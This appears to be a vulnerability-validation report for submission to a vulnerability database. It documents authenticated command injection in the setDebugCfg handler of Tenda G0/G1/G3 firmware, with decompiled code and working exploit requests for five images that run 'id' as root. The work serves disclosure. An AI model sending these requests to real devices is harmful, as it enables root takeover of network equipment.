# Tenda G0/G1/G3 setDebugCfg Confirmed 0day Validation - 2026-05-29

## Verdict

Confirmed service-level command injection.

This is now VulnDB-submission ready for the confirmed Tenda G0/G1/G3 AP management router assets. It is no longer only a FirmRec `likely` record because normal HTTP requests to the running `httpd` service created root command-execution sentinels in five affected firmware images.

## Scope

Confirmed affected images:

```text
G0-PoE___30_PoE_AP___US_G0-POEV1.0RE_V15.11.0.69039_CN_TDC01.zip
G0-PoE___30_PoE_AP___US_G0-PoEV1.0RE_V15.11.0.55876_TDC.zip
G0___30_AP___US_G0V1.0RE_V15.11.0.55876_TDC.zip
G1___100_AP___US_G1V1.0_G3V3.0br_V15.11.0.179502_CN_TDC.zip
G3___200_AP___G3V3_V1511020.zip
```

FirmRec source:

```text
Batch: inout/reports/tenda_new_all_batch_outputs/tenda_new_all_closed_022_of_046/vulndb__vulndb.json
Batch: inout/reports/tenda_new_all_batch_outputs/tenda_new_all_closed_023_of_046/vulndb__vulndb.json
Records:
- FRV-TENDA_NEW_ALL-httpd-bc46fcb2
- FRV-TENDA_NEW_ALL-httpd-08fc8401
- FRV-TENDA_NEW_ALL-httpd-441dc02a
- FRV-TENDA_NEW_ALL-httpd-b5dd4d4c
- FRV-TENDA_NEW_ALL-httpd-8663c6c1
```

## Static Evidence

Binary hashes:

```text
c6e5c8d94a128ff719248187dfb764b9d34c6e131971bbac31a652d89369d4a4  httpd_g0_poe_69039
564e03cb42b5bbc3d2a11b4995f5569514ca3a7433ead383557c243fd0f66053  httpd_g0_poe_55876
564e03cb42b5bbc3d2a11b4995f5569514ca3a7433ead383557c243fd0f66053  G0 non-PoE 55876 bin/httpd
0958b264f2a1ce624aa05e682dfb469aa01aa3c4b4d5926dd28ff1cff4542a60  G1 179502 bin/httpd
1a562cc683e494387ce65d8b27a5c1b22819a55ee8a77e597fe2dadaf655800f  G3 1511020 bin/httpd
```

Ghidra decompilation shows the same vulnerable handler in both versions:

```c
void formSetDebugCfg(undefined4 param_1)
{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  char acStack_8c [132];

  memset(acStack_8c,0,0x80);
  uVar1 = websGetVar(param_1,"enable",...);
  uVar2 = websGetVar(param_1,"level",...);
  uVar3 = websGetVar(param_1,"module","httpd");
  sprintf(acStack_8c,"echo enable=%s level=%s > /var/debug/%s",uVar1,uVar2,uVar3);
  system(acStack_8c);
  outputToWebs(param_1,acStack_8c);
}
```

The handler is registered as:

```c
websDefineAction("setDebugCfg", formSetDebugCfg);
```

## Runtime Evidence

### 69039

Initialization response:

```text
{"setQuickCfgWifiAndLogin":{"redirect":"redirectPage=index.asp#network/wanSet.html"}}
```

Auth response:

```text
{"auth":0}
```

Exploit request:

```text
GET /goform/setDebugCfg?enable=1&level=2&module=x%3Bid%3E%2Ftmp%2FTENDA_G0_DEBUGCFG_PWN%3B%23 HTTP/1.1
```

Response body:

```text
echo enable=1 level=2 > /var/debug/x;id>/tmp/TENDA_G0_DEBUGCFG_PWN;#
```

Sentinel:

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 55876

Initialization response:

```text
{"setQuickCfgWifiAndLogin":{"redirect":"redirectPage=index.asp#network/wanSet.html"}}
```

Auth response:

```text
{"auth":0}
```

Exploit request:

```text
GET /goform/setDebugCfg?enable=1&level=2&module=x%3Bid%3E%2Ftmp%2FTENDA_G0_55876_DEBUGCFG_PWN%3B%23 HTTP/1.1
```

Response body:

```text
echo enable=1 level=2 > /var/debug/x;id>/tmp/TENDA_G0_55876_DEBUGCFG_PWN;#
```

Sentinel:

```text
uid=0(root) gid=0(root) groups=0(root)
```

### G0 non-PoE 55876

The non-PoE G0 55876 image contains the same `bin/httpd` SHA-256 as the G0-PoE 55876 image and the same handler address.

Initialization response:

```text
{"setQuickCfgWifiAndLogin":{"redirect":"redirectPage=index.asp#network/wanSet.html"}}
```

Auth response:

```text
{"auth":0}
```

Exploit request:

```text
GET /goform/setDebugCfg?enable=1&level=2&module=x%3Bid%3E%2Ftmp%2FTENDA_G0_NONPOE_DEBUGCFG_PWN%3B%23 HTTP/1.1
```

Response body:

```text
echo enable=1 level=2 > /var/debug/x;id>/tmp/TENDA_G0_NONPOE_DEBUGCFG_PWN;#
```

Sentinel:

```text
uid=0(root) gid=0(root) groups=0(root)
```

### G1 179502

The G1/G3 ARM web UI uses `/goform/initAdminUser` for first setup and `/login/Auth` for login. After that normal first-login flow, the live `httpd` service accepted `/goform/setDebugCfg` and created the sentinel.

Login-state check:

```text
[{"loginType":"admin","loginIP":"127.0.0.1","loginMAC":"","lastAccessTime":1234099}]
```

Exploit request:

```text
GET /goform/setDebugCfg?enable=1&level=2&module=x%3Bid%3E%2Ftmp%2FTENDA_G1_179502_DEBUGCFG_RECHECK%3B%23 HTTP/1.1
```

Response body:

```text
echo enable=1 level=2 > /var/debug/x;id>/tmp/TENDA_G1_179502_DEBUGCFG_RECHECK;#
```

Sentinel:

```text
uid=0(root) gid=0(root) groups=0(root)
```

### G3 1511020

Login-state check:

```text
[{"loginType":"admin","loginIP":"127.0.0.1","loginMAC":"","lastAccessTime":1234099}]
```

Exploit request:

```text
GET /goform/setDebugCfg?enable=1&level=2&module=x%3Bid%3E%2Ftmp%2FTENDA_G3_1511020_DEBUGCFG_RECHECK%3B%23 HTTP/1.1
```

Response body:

```text
echo enable=1 level=2 > /var/debug/x;id>/tmp/TENDA_G3_1511020_DEBUGCFG_RECHECK;#
```

Sentinel:

```text
uid=0(root) gid=0(root) groups=0(root)
```

## Submission Boundary

Submit this as authenticated command injection, not unauthenticated RCE. The G0 runtime path used product first-setup initialization plus `/goform/module` authentication before triggering `/goform/setDebugCfg`; the G1/G3 runtime path used product first-setup initialization plus `/login/Auth` before triggering the same vulnerable endpoint.

Recommended severity:

```text
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8 High
```

## Evidence Index

```text
VulnDB draft:
inout/reports/tenda_new_all_manual/vulndb_tenda_g0_poe_debugcfg_cmd_injection_20260529.md

Ghidra callers/decompilation:
inout/reports/tenda_new_all_manual/g0_debugcfg_69039_callers.jsonl
inout/reports/tenda_new_all_manual/g0_debugcfg_55876_callers.jsonl

Runtime evidence:
inout/reports/tenda_new_all_manual/g0_debugcfg_evidence/69039_init_body.txt
inout/reports/tenda_new_all_manual/g0_debugcfg_evidence/69039_auth_body.txt
inout/reports/tenda_new_all_manual/g0_debugcfg_evidence/69039_debug_body.txt
inout/reports/tenda_new_all_manual/g0_debugcfg_evidence/69039_sentinel.txt
inout/reports/tenda_new_all_manual/g0_debugcfg_evidence/55876_init_body.txt
inout/reports/tenda_new_all_manual/g0_debugcfg_evidence/55876_auth_body.txt
inout/reports/tenda_new_all_manual/g0_debugcfg_evidence/55876_debug_body.txt
inout/reports/tenda_new_all_manual/g0_debugcfg_evidence/55876_sentinel.txt
inout/reports/tenda_new_all_manual/g_series_debugcfg_evidence_20260529/g0_55876_init_body.txt
inout/reports/tenda_new_all_manual/g_series_debugcfg_evidence_20260529/g0_55876_auth_body.txt
inout/reports/tenda_new_all_manual/g_series_debugcfg_evidence_20260529/g0_55876_debug_body.txt
inout/reports/tenda_new_all_manual/g_series_debugcfg_evidence_20260529/g0_55876_sentinel.txt
inout/reports/tenda_new_all_manual/g1g3_recheck_20260529/g1_179502_check_body.txt
inout/reports/tenda_new_all_manual/g1g3_recheck_20260529/g1_179502_debug_cookie_body.txt
inout/reports/tenda_new_all_manual/g1g3_recheck_20260529/g1_179502_sentinel.txt
inout/reports/tenda_new_all_manual/g1g3_recheck_20260529/g3_1511020_check_body.txt
inout/reports/tenda_new_all_manual/g1g3_recheck_20260529/g3_1511020_debug_cookie_body.txt
inout/reports/tenda_new_all_manual/g1g3_recheck_20260529/g3_1511020_sentinel.txt
```
